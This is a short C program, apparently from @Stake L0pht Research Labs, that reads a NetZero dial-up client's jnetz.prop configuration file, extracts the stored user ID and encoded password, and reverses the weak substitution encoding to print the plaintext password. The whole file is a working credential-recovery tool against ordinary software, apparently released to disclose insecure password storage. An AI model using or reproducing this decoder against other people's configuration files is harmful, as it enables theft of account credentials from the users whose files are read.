#include <stdio.h>
#include <string.h>

#define UID_SIZE	64
#define PASS_CIPHER_SIZE	128
#define PASS_PLAIN_SIZE	64
#define BUF_SIZE 256

const char decTable[6][16] = {
  {'`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o'},
  {'p','q','r','s','t','u','v','w','x','y','z','{','|','}','~',0},
  {'@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O'},
  {'P','Q','R','S','T','U','V','W','X','Y','Z','[','\\',']','^','_'},
  {'0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?'},
  {' ','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/'}
};

int nz_decrypt(char cCipherPass[PASS_CIPHER_SIZE], 
  char cPlainPass[PASS_PLAIN_SIZE])
{
	int passLen, i, idx1, idx2;
	passLen = strlen(cCipherPass)/2;
	
	if (passLen > PASS_PLAIN_SIZE)
	{
		printf("Error: Plain text array too small\n");
		return 1;
	}

	for (i = 0; i < passLen; i++)
	{
		switch(cCipherPass[i])
		{
		case '1':
			idx2 = 0; break;
		case 'a':
			idx2 = 1; break;
		case 'M':
			idx2 = 2; break;
		case 'Q':
			idx2 = 3; break;
		case 'f':
			idx2 = 4; break;
		case '7':
			idx2 = 5; break;
		case 'g':
			idx2 = 6; break;
		case 'T':
			idx2 = 7; break;
		case '9':
			idx2 = 8; break;
		case '4':
			idx2 = 9; break;
		case 'L':
			idx2 = 10; break;
		case 'W':
			idx2 = 11; break;
		case 'e':
			idx2 = 12; break;
		case '6':
			idx2 = 13; break;
		case 'y':
			idx2 = 14; break;
		case 'C':
			idx2 = 15; break;
		default:
			printf("Error: Unknown Cipher Text index: %c\n", cCipherPass[i]);
			return 1;
			break;
		}

		switch(cCipherPass[i+passLen])
		{
		case 'g':
			idx1 = 0; break;
		case 'T':
			idx1 = 1; break;
		case 'f':
			idx1 = 2; break;
		case '7':
			idx1 = 3; break;
		case 'Q':
			idx1 = 4; break;
		case 'M':
			idx1 = 5; break;
		default:
			printf("Error: Unknown Cipher Text Set: %c\n", 
			  cCipherPass[i+passLen]);
			return 1;
			break;
		}

		cPlainPass[i] = decTable[idx1][idx2];
	}
	cPlainPass[i] = 0;

	return 0;
}

int main(void)
{
	FILE *hParams;
	char cBuffer[BUF_SIZE], cUID[UID_SIZE];
	char cCipherPass[PASS_CIPHER_SIZE], cPlainPass[PASS_PLAIN_SIZE];
	int done = 2;

	printf("\nNet Zero Password Decryptor\n");
	printf("Brian Carrier [bcarrier@atstake.com]\n");
	printf("@Stake L0pht Research Labs\n");
	printf("http://www.atstake.com\n\n");

	if ((hParams = fopen("jnetz.prop","r")) == NULL)
	{
		printf("Unable to find jnetz.prop file\n");
		return 1;
	}	

	while ((fgets(cBuffer, BUF_SIZE, hParams) != NULL) && (done > 0))
	{
		if (strncmp(cBuffer, "ProfUID=", 8) == 0)
		{
			done--;
			strncpy(cUID, cBuffer + 8, UID_SIZE);
			printf("UserID: %s", cUID);
		}

		if (strncmp(cBuffer, "ProfPWD=", 8) == 0)
		{
			done--;
			strncpy(cCipherPass, cBuffer + 8, PASS_CIPHER_SIZE);
			printf("Encrypted Password: %s", cCipherPass);

			if (nz_decrypt(cCipherPass, cPlainPass) != 0)
				return 1;
			else
				printf("Plain Text Password: %s\n", cPlainPass);
		}

	}

	fclose(hParams);

	if (done > 0)
	{
		printf("Invalid jnetz.prop file\n");
		return 1;
	} else {
		return 0;
	}
}
